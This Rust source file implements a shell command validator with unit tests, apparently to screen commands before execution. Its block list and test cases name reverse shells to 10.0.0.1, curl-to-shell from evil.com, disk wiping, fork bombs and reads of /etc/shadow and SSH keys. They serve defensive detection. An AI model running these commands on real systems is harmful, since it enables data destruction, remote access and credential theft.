//! Command validation module.
//!
//! Provides comprehensive validation of shell commands to prevent:
//! - Command injection attacks
//! - Destructive system commands
//! - Path traversal attacks
//! - Privilege escalation attempts

use std::collections::HashSet;

/// Result of command validation.
#[derive(Debug, Clone)]
pub struct ValidationResult {
    /// Whether the command is considered safe
    pub is_safe: bool,

    /// Validation errors found
    pub errors: Vec<ValidationError>,

    /// Warnings (non-blocking issues)
    pub warnings: Vec<String>,

    /// The highest severity level of issues found
    pub severity: ValidationSeverity,
}

impl ValidationResult {
    /// Create an OK result (no issues).
    pub fn ok() -> Self {
        Self {
            is_safe: true,
            errors: Vec::new(),
            warnings: Vec::new(),
            severity: ValidationSeverity::None,
        }
    }

    /// Create an error result.
    pub fn error(error: ValidationError, severity: ValidationSeverity) -> Self {
        Self { is_safe: false, errors: vec![error], warnings: Vec::new(), severity }
    }

    /// Create a warning result (safe but with warnings).
    pub fn warning(warning: String) -> Self {
        Self {
            is_safe: true,
            errors: Vec::new(),
            warnings: vec![warning],
            severity: ValidationSeverity::Low,
        }
    }

    /// Check if the result indicates the command is safe to execute.
    pub fn is_safe(&self) -> bool {
        self.is_safe
    }

    /// Add an error to the result.
    pub fn add_error(&mut self, error: ValidationError, severity: ValidationSeverity) {
        self.is_safe = false;
        self.errors.push(error);
        if severity > self.severity {
            self.severity = severity;
        }
    }

    /// Add a warning to the result.
    pub fn add_warning(&mut self, warning: String) {
        self.warnings.push(warning);
        if self.severity == ValidationSeverity::None {
            self.severity = ValidationSeverity::Low;
        }
    }

    /// Merge another result into this one.
    pub fn merge(&mut self, other: ValidationResult) {
        if !other.is_safe {
            self.is_safe = false;
        }
        self.errors.extend(other.errors);
        self.warnings.extend(other.warnings);
        if other.severity > self.severity {
            self.severity = other.severity;
        }
    }
}

/// Severity level of validation issues.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum ValidationSeverity {
    /// No issues
    None,
    /// Low severity (informational)
    Low,
    /// Medium severity (potential risk)
    Medium,
    /// High severity (likely dangerous)
    High,
    /// Critical severity (definitely dangerous)
    Critical,
}

impl ValidationSeverity {
    /// Get a human-readable description of the severity.
    pub fn description(&self) -> &'static str {
        match self {
            Self::None => "No issues",
            Self::Low => "Low risk",
            Self::Medium => "Medium risk",
            Self::High => "High risk",
            Self::Critical => "Critical risk",
        }
    }
}

/// Types of validation errors.
#[derive(Debug, Clone)]
pub enum ValidationError {
    /// Command contains dangerous patterns
    DangerousPattern { pattern: InjectionPattern, matched: String },

    /// Command contains shell injection characters
    ShellInjection { character: char, position: usize },

    /// Command attempts path traversal
    PathTraversal { path: String },

    /// Command is too long
    CommandTooLong { length: usize, max: usize },

    /// Command contains null bytes
    NullBytes,

    /// Command contains suspicious encoding
    SuspiciousEncoding { description: String },

    /// Command attempts privilege escalation
    PrivilegeEscalation { command: String },

    /// Custom blocked pattern matched
    CustomBlocked { pattern: String },
}

impl ValidationError {
    /// Get a human-readable description of the error.
    pub fn description(&self) -> String {
        match self {
            Self::DangerousPattern { pattern, matched } => {
                format!(
                    "Dangerous pattern detected: {} (matched: '{}')",
                    pattern.description(),
                    matched
                )
            }
            Self::ShellInjection { character, position } => {
                format!("Shell injection character '{}' at position {}", character, position)
            }
            Self::PathTraversal { path } => {
                format!("Path traversal attempt detected: {}", path)
            }
            Self::CommandTooLong { length, max } => {
                format!("Command too long: {} bytes (max: {})", length, max)
            }
            Self::NullBytes => "Command contains null bytes".to_string(),
            Self::SuspiciousEncoding { description } => {
                format!("Suspicious encoding: {}", description)
            }
            Self::PrivilegeEscalation { command } => {
                format!("Privilege escalation attempt: {}", command)
            }
            Self::CustomBlocked { pattern } => {
                format!("Blocked by custom pattern: {}", pattern)
            }
        }
    }
}

/// Known dangerous command patterns.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum InjectionPattern {
    /// Recursive file deletion
    RecursiveDelete,
    /// Writing to system directories
    SystemWrite,
    /// Disk formatting
    DiskFormat,
    /// Fork bomb
    ForkBomb,
    /// Chmod on system directories
    SystemChmod,
    /// Chown on system directories
    SystemChown,
    /// Network exfiltration
    NetworkExfil,
    /// Curl/wget piped to shell
    PipedExecution,
    /// Reverse shell patterns
    ReverseShell,
    /// Base64 decoded execution
    EncodedExecution,
    /// History manipulation
    HistoryManipulation,
    /// Password file access
    PasswordFileAccess,
    /// SSH key theft
    SshKeyTheft,
    /// Cron manipulation
    CronManipulation,
    /// Environment variable manipulation
    EnvManipulation,
}

impl InjectionPattern {
    /// Get a description of the pattern.
    pub fn description(&self) -> &'static str {
        match self {
            Self::RecursiveDelete => "Recursive file deletion",
            Self::SystemWrite => "Writing to system directories",
            Self::DiskFormat => "Disk formatting command",
            Self::ForkBomb => "Fork bomb attack",
            Self::SystemChmod => "Changing system file permissions",
            Self::SystemChown => "Changing system file ownership",
            Self::NetworkExfil => "Network data exfiltration",
            Self::PipedExecution => "Remote code piped to shell",
            Self::ReverseShell => "Reverse shell pattern",
            Self::EncodedExecution => "Encoded command execution",
            Self::HistoryManipulation => "Shell history manipulation",
            Self::PasswordFileAccess => "Password file access",
            Self::SshKeyTheft => "SSH key access",
            Self::CronManipulation => "Cron job manipulation",
            Self::EnvManipulation => "Environment variable injection",
        }
    }

    /// Get the severity of this pattern.
    pub fn severity(&self) -> ValidationSeverity {
        match self {
            Self::RecursiveDelete => ValidationSeverity::Critical,
            Self::SystemWrite => ValidationSeverity::Critical,
            Self::DiskFormat => ValidationSeverity::Critical,
            Self::ForkBomb => ValidationSeverity::Critical,
            Self::SystemChmod => ValidationSeverity::High,
            Self::SystemChown => ValidationSeverity::High,
            Self::NetworkExfil => ValidationSeverity::High,
            Self::PipedExecution => ValidationSeverity::High,
            Self::ReverseShell => ValidationSeverity::Critical,
            Self::EncodedExecution => ValidationSeverity::High,
            Self::HistoryManipulation => ValidationSeverity::Medium,
            Self::PasswordFileAccess => ValidationSeverity::High,
            Self::SshKeyTheft => ValidationSeverity::High,
            Self::CronManipulation => ValidationSeverity::High,
            Self::EnvManipulation => ValidationSeverity::Medium,
        }
    }
}

/// Information about a command validation check.
#[derive(Debug, Clone)]
pub struct CommandValidation {
    /// The original command
    pub command: String,

    /// Whether the command passed validation
    pub passed: bool,

    /// Issues found during validation
    pub issues: Vec<ValidationError>,

    /// Overall risk score (0-100)
    pub risk_score: u8,
}

/// Command validator that checks for injection and dangerous patterns.
#[derive(Debug)]
pub struct CommandValidator {
    /// Dangerous string patterns to check
    dangerous_patterns: Vec<(String, InjectionPattern)>,

    /// Shell metacharacters that could enable injection
    dangerous_chars: HashSet<char>,

    /// Paths that should never be written to
    protected_paths: Vec<String>,

    /// Custom blocked patterns
    custom_blocked: Vec<String>,
}

impl Default for CommandValidator {
    fn default() -> Self {
        Self::new()
    }
}

impl CommandValidator {
    /// Create a new command validator with default rules.
    pub fn new() -> Self {
        let dangerous_patterns = vec![
            // Recursive deletion
            ("rm -rf /".to_string(), InjectionPattern::RecursiveDelete),
            ("rm -rf /*".to_string(), InjectionPattern::RecursiveDelete),
            ("rm -r /".to_string(), InjectionPattern::RecursiveDelete),
            ("rm -fr /".to_string(), InjectionPattern::RecursiveDelete),
            ("sudo rm -rf".to_string(), InjectionPattern::RecursiveDelete),
            // System writes
            ("> /dev/sda".to_string(), InjectionPattern::SystemWrite),
            ("> /dev/hda".to_string(), InjectionPattern::SystemWrite),
            ("> /dev/nvme".to_string(), InjectionPattern::SystemWrite),
            ("dd if=".to_string(), InjectionPattern::DiskFormat),
            ("mkfs".to_string(), InjectionPattern::DiskFormat),
            ("fdisk".to_string(), InjectionPattern::DiskFormat),
            ("parted".to_string(), InjectionPattern::DiskFormat),
            // Fork bomb
            (":(){:|:&};:".to_string(), InjectionPattern::ForkBomb),
            (":(){ :|:& };:".to_string(), InjectionPattern::ForkBomb),
            // System permission changes
            ("chmod -R 777 /".to_string(), InjectionPattern::SystemChmod),
            ("chmod 777 /".to_string(), InjectionPattern::SystemChmod),
            ("chown -R".to_string(), InjectionPattern::SystemChown),
            // Network exfiltration patterns
            ("nc -e".to_string(), InjectionPattern::ReverseShell),
            ("ncat -e".to_string(), InjectionPattern::ReverseShell),
            ("/dev/tcp/".to_string(), InjectionPattern::ReverseShell),
            ("/dev/udp/".to_string(), InjectionPattern::ReverseShell),
            ("bash -i >& /dev/tcp".to_string(), InjectionPattern::ReverseShell),
            // Encoded execution
            ("base64 -d".to_string(), InjectionPattern::EncodedExecution),
            ("base64 --decode".to_string(), InjectionPattern::EncodedExecution),
            // History manipulation
            ("histfile=/dev/null".to_string(), InjectionPattern::HistoryManipulation),
            ("unset histfile".to_string(), InjectionPattern::HistoryManipulation),
            ("history -c".to_string(), InjectionPattern::HistoryManipulation),
            // Sensitive file access
            ("/etc/passwd".to_string(), InjectionPattern::PasswordFileAccess),
            ("/etc/shadow".to_string(), InjectionPattern::PasswordFileAccess),
            ("~/.ssh/".to_string(), InjectionPattern::SshKeyTheft),
            (".ssh/id_rsa".to_string(), InjectionPattern::SshKeyTheft),
            (".ssh/id_ed25519".to_string(), InjectionPattern::SshKeyTheft),
            // Cron manipulation
            ("crontab -r".to_string(), InjectionPattern::CronManipulation),
            ("/etc/cron".to_string(), InjectionPattern::CronManipulation),
        ];

        // Characters that could enable command injection when not properly escaped
        let dangerous_chars: HashSet<char> = [
            '`',  // Command substitution
            '$',  // Variable expansion (can be dangerous in certain contexts)
            '\0', // Null byte
        ]
        .into_iter()
        .collect();

        let protected_paths = vec![
            "/".to_string(),
            "/etc".to_string(),
            "/usr".to_string(),
            "/bin".to_string(),
            "/sbin".to_string(),
            "/boot".to_string(),
            "/dev".to_string(),
            "/proc".to_string(),
            "/sys".to_string(),
            "/var".to_string(),
            "/root".to_string(),
        ];

        Self { dangerous_patterns, dangerous_chars, protected_paths, custom_blocked: Vec::new() }
    }

    /// Add a custom blocked pattern.
    #[must_use]
    pub fn with_blocked_pattern(mut self, pattern: impl Into<String>) -> Self {
        self.custom_blocked.push(pattern.into());
        self
    }

    /// Validate a command string.
    pub fn validate(&self, command: &str) -> ValidationResult {
        let mut result = ValidationResult::ok();

        // Check for null bytes
        if command.contains('\0') {
            result.add_error(ValidationError::NullBytes, ValidationSeverity::Critical);
            return result;
        }

        // Normalize the command for pattern matching
        let normalized = self.normalize_command(command);

        // Check dangerous patterns
        for (pattern, pattern_type) in &self.dangerous_patterns {
            if normalized.contains(pattern) || command.to_lowercase().contains(pattern) {
                result.add_error(
                    ValidationError::DangerousPattern {
                        pattern: pattern_type.clone(),
                        matched: pattern.clone(),
                    },
                    pattern_type.severity(),
                );
            }
        }

        // Check for piped execution (curl/wget to shell)
        if self.check_piped_execution(command) {
            result.add_error(
                ValidationError::DangerousPattern {
                    pattern: InjectionPattern::PipedExecution,
                    matched: "curl/wget piped to shell".to_string(),
                },
                ValidationSeverity::High,
            );
        }

        // Check for path traversal
        if let Some(path) = self.check_path_traversal(command) {
            result.add_error(ValidationError::PathTraversal { path }, ValidationSeverity::High);
        }

        // Check for privilege escalation patterns
        if let Some(priv_cmd) = self.check_privilege_escalation(command) {
            result.add_error(
                ValidationError::PrivilegeEscalation { command: priv_cmd },
                ValidationSeverity::High,
            );
        }

        // Check for dangerous characters that could enable injection
        for (pos, ch) in command.chars().enumerate() {
            if self.dangerous_chars.contains(&ch) {
                // Backticks are always dangerous
                if ch == '`' {
                    result.add_error(
                        ValidationError::ShellInjection { character: ch, position: pos },
                        ValidationSeverity::High,
                    );
                }
                // $ followed by ( is command substitution
                else if ch == '$' && command.chars().nth(pos + 1) == Some('(') {
                    result.add_warning(format!(
                        "Command substitution at position {} - verify this is intentional",
                        pos
                    ));
                }
            }
        }

        // Check custom blocked patterns
        for pattern in &self.custom_blocked {
            if command.contains(pattern) || normalized.contains(pattern) {
                result.add_error(
                    ValidationError::CustomBlocked { pattern: pattern.clone() },
                    ValidationSeverity::High,
                );
            }
        }

        result
    }

    /// Normalize a command for pattern matching.
    fn normalize_command(&self, command: &str) -> String {
        command.to_lowercase().replace('\t', " ").split_whitespace().collect::<Vec<_>>().join(" ")
    }

    /// Check for curl/wget piped to shell patterns.
    fn check_piped_execution(&self, command: &str) -> bool {
        let cmd_lower = command.to_lowercase();

        // Check for piped execution patterns
        let has_download_cmd = cmd_lower.contains("curl") || cmd_lower.contains("wget");
        let has_pipe = cmd_lower.contains('|');
        let has_shell = cmd_lower.contains("| sh")
            || cmd_lower.contains("|sh")
            || cmd_lower.contains("| bash")
            || cmd_lower.contains("|bash")
            || cmd_lower.contains("| zsh")
            || cmd_lower.contains("|zsh")
            || cmd_lower.contains("| python")
            || cmd_lower.contains("|python")
            || cmd_lower.contains("| perl")
            || cmd_lower.contains("|perl")
            || cmd_lower.contains("| ruby")
            || cmd_lower.contains("|ruby");

        has_download_cmd && has_pipe && has_shell
    }

    /// Check for path traversal attempts.
    fn check_path_traversal(&self, command: &str) -> Option<String> {
        // Look for ../ patterns that could escape directories
        if command.contains("../") || command.contains("..\\") {
            // Check if it's trying to access protected paths
            for protected in &self.protected_paths {
                if command.contains(&format!("../{}", protected.trim_start_matches('/')))
                    || command.contains(&format!("../..{}", protected))
                {
                    return Some(format!("Attempt to access {} via traversal", protected));
                }
            }

            // Even without hitting protected paths, excessive traversal is suspicious
            let traversal_count = command.matches("../").count() + command.matches("..\\").count();
            if traversal_count >= 3 {
                return Some(format!("Excessive path traversal ({} levels)", traversal_count));
            }
        }

        None
    }

    /// Check for privilege escalation patterns.
    fn check_privilege_escalation(&self, command: &str) -> Option<String> {
        let cmd_lower = command.to_lowercase();

        // sudo with dangerous commands
        if cmd_lower.starts_with("sudo ") || cmd_lower.contains(" sudo ") {
            let sudo_patterns = [
                "sudo su",
                "sudo -i",
                "sudo bash",
                "sudo sh",
                "sudo chmod",
                "sudo chown",
                "sudo rm",
                "sudo dd",
            ];

            for pattern in sudo_patterns {
                if cmd_lower.contains(pattern) {
                    return Some(pattern.to_string());
                }
            }
        }

        // setuid/setgid manipulation
        if cmd_lower.contains("chmod u+s") || cmd_lower.contains("chmod g+s") {
            return Some("setuid/setgid bit manipulation".to_string());
        }

        // sudoers manipulation
        if cmd_lower.contains("/etc/sudoers") || cmd_lower.contains("visudo") {
            return Some("sudoers file manipulation".to_string());
        }

        None
    }

    /// Quick check if a command looks dangerous (for UI warning).
    pub fn quick_check(&self, command: &str) -> bool {
        let result = self.validate(command);
        !result.is_safe()
    }

    /// Get the risk score for a command (0-100).
    pub fn risk_score(&self, command: &str) -> u8 {
        let result = self.validate(command);

        match result.severity {
            ValidationSeverity::None => 0,
            ValidationSeverity::Low => 20,
            ValidationSeverity::Medium => 40,
            ValidationSeverity::High => 70,
            ValidationSeverity::Critical => 100,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_commands() {
        let validator = CommandValidator::new();

        let safe_commands = [
            "npm run build",
            "cargo test",
            "make clean",
            "git status",
            "ls -la",
            "echo hello",
            "python script.py",
            "node index.js",
            "docker compose up",
            "kubectl get pods",
        ];

        for cmd in safe_commands {
            let result = validator.validate(cmd);
            assert!(result.is_safe(), "Command '{}' should be safe", cmd);
        }
    }

    #[test]
    fn test_dangerous_rm_commands() {
        let validator = CommandValidator::new();

        let dangerous = ["rm -rf /", "rm -rf /*", "rm -r /", "sudo rm -rf /", "rm -fr /"];

        for cmd in dangerous {
            let result = validator.validate(cmd);
            assert!(!result.is_safe(), "Command '{}' should be dangerous", cmd);
            assert!(
                result.errors.iter().any(|e| matches!(
                    e,
                    ValidationError::DangerousPattern {
                        pattern: InjectionPattern::RecursiveDelete,
                        ..
                    }
                )),
                "Should detect recursive delete in '{}'",
                cmd
            );
        }
    }

    #[test]
    fn test_piped_execution() {
        let validator = CommandValidator::new();

        let dangerous = [
            "curl http://evil.com | sh",
            "wget http://evil.com -O - | bash",
            "curl http://example.com|sh",
            "curl -s http://example.com | python",
        ];

        for cmd in dangerous {
            let result = validator.validate(cmd);
            assert!(!result.is_safe(), "Command '{}' should be dangerous", cmd);
            assert!(
                result.errors.iter().any(|e| matches!(
                    e,
                    ValidationError::DangerousPattern {
                        pattern: InjectionPattern::PipedExecution,
                        ..
                    }
                )),
                "Should detect piped execution in '{}'",
                cmd
            );
        }
    }

    #[test]
    fn test_fork_bomb() {
        let validator = CommandValidator::new();

        let result = validator.validate(":(){:|:&};:");
        assert!(!result.is_safe());
        assert!(result.errors.iter().any(|e| matches!(
            e,
            ValidationError::DangerousPattern { pattern: InjectionPattern::ForkBomb, .. }
        )));
    }

    #[test]
    fn test_null_bytes() {
        let validator = CommandValidator::new();

        let cmd = "echo hello\0world";
        let result = validator.validate(cmd);
        assert!(!result.is_safe());
        assert!(result.errors.iter().any(|e| matches!(e, ValidationError::NullBytes)));
    }

    #[test]
    fn test_backtick_injection() {
        let validator = CommandValidator::new();

        let result = validator.validate("echo `rm -rf /`");
        assert!(!result.is_safe());
        assert!(result.errors.iter().any(|e| matches!(e, ValidationError::ShellInjection { .. })));
    }

    #[test]
    fn test_path_traversal() {
        let validator = CommandValidator::new();

        let traversal_commands = ["cat ../../../etc/passwd", "ls ../../../../root/.ssh"];

        for cmd in traversal_commands {
            let result = validator.validate(cmd);
            // Should have at least a warning about path traversal or dangerous access
            assert!(
                !result.is_safe() || !result.warnings.is_empty(),
                "Command '{}' should be flagged",
                cmd
            );
        }
    }

    #[test]
    fn test_privilege_escalation() {
        let validator = CommandValidator::new();

        let dangerous =
            ["sudo su", "sudo bash", "sudo rm -rf /home/user", "chmod u+s /usr/bin/something"];

        for cmd in dangerous {
            let result = validator.validate(cmd);
            assert!(!result.is_safe(), "Command '{}' should be dangerous", cmd);
        }
    }

    #[test]
    fn test_reverse_shell_patterns() {
        let validator = CommandValidator::new();

        let dangerous = ["nc -e /bin/sh 10.0.0.1 4444", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"];

        for cmd in dangerous {
            let result = validator.validate(cmd);
            assert!(!result.is_safe(), "Command '{}' should be dangerous", cmd);
        }
    }

    #[test]
    fn test_disk_format_commands() {
        let validator = CommandValidator::new();

        let dangerous = ["mkfs.ext4 /dev/sda1", "dd if=/dev/zero of=/dev/sda", "fdisk /dev/sda"];

        for cmd in dangerous {
            let result = validator.validate(cmd);
            assert!(!result.is_safe(), "Command '{}' should be dangerous", cmd);
        }
    }

    #[test]
    fn test_custom_blocked_pattern() {
        let validator = CommandValidator::new().with_blocked_pattern("my-secret-command");

        let result = validator.validate("my-secret-command --flag");
        assert!(!result.is_safe());
        assert!(result.errors.iter().any(|e| matches!(e, ValidationError::CustomBlocked { .. })));
    }

    #[test]
    fn test_risk_score() {
        let validator = CommandValidator::new();

        assert_eq!(validator.risk_score("npm run build"), 0);
        assert!(validator.risk_score("rm -rf /") >= 70);
        assert!(validator.risk_score(":(){:|:&};:") >= 70);
    }

    #[test]
    fn test_validation_result_merging() {
        let mut result1 = ValidationResult::ok();
        result1.add_warning("Warning 1".to_string());

        let mut result2 = ValidationResult::ok();
        result2.add_error(ValidationError::NullBytes, ValidationSeverity::Critical);

        result1.merge(result2);

        assert!(!result1.is_safe());
        assert_eq!(result1.warnings.len(), 1);
        assert_eq!(result1.errors.len(), 1);
        assert_eq!(result1.severity, ValidationSeverity::Critical);
    }

    #[test]
    fn test_safe_curl_usage() {
        let validator = CommandValidator::new();

        // These should be safe - curl without piping to shell
        let safe = [
            "curl http://example.com",
            "curl -o file.txt http://example.com",
            "curl http://example.com > output.txt",
            "wget http://example.com",
        ];

        for cmd in safe {
            let result = validator.validate(cmd);
            assert!(result.is_safe(), "Command '{}' should be safe", cmd);
        }
    }

    #[test]
    fn test_sensitive_file_access() {
        let validator = CommandValidator::new();

        let dangerous =
            ["cat /etc/passwd", "cat /etc/shadow", "cat ~/.ssh/id_rsa", "cp .ssh/id_ed25519 /tmp/"];

        for cmd in dangerous {
            let result = validator.validate(cmd);
            assert!(!result.is_safe(), "Command '{}' should be dangerous", cmd);
        }
    }

    #[test]
    fn test_history_manipulation() {
        let validator = CommandValidator::new();

        let dangerous = ["export HISTFILE=/dev/null", "unset HISTFILE", "history -c"];

        for cmd in dangerous {
            let result = validator.validate(cmd);
            assert!(!result.is_safe(), "Command '{}' should be dangerous", cmd);
        }
    }

    #[test]
    fn test_command_validation_struct() {
        let validation = CommandValidation {
            command: "npm run build".to_string(),
            passed: true,
            issues: Vec::new(),
            risk_score: 0,
        };

        assert!(validation.passed);
        assert_eq!(validation.risk_score, 0);
    }

    #[test]
    fn test_severity_ordering() {
        assert!(ValidationSeverity::Critical > ValidationSeverity::High);
        assert!(ValidationSeverity::High > ValidationSeverity::Medium);
        assert!(ValidationSeverity::Medium > ValidationSeverity::Low);
        assert!(ValidationSeverity::Low > ValidationSeverity::None);
    }

    #[test]
    fn test_validation_error_descriptions() {
        let errors = [
            ValidationError::DangerousPattern {
                pattern: InjectionPattern::RecursiveDelete,
                matched: "rm -rf /".to_string(),
            },
            ValidationError::ShellInjection { character: '`', position: 5 },
            ValidationError::PathTraversal { path: "../../../etc".to_string() },
            ValidationError::CommandTooLong { length: 10001, max: 10000 },
            ValidationError::NullBytes,
            ValidationError::SuspiciousEncoding { description: "base64".to_string() },
            ValidationError::PrivilegeEscalation { command: "sudo bash".to_string() },
            ValidationError::CustomBlocked { pattern: "blocked".to_string() },
        ];

        for error in errors {
            let desc = error.description();
            assert!(!desc.is_empty());
        }
    }
}
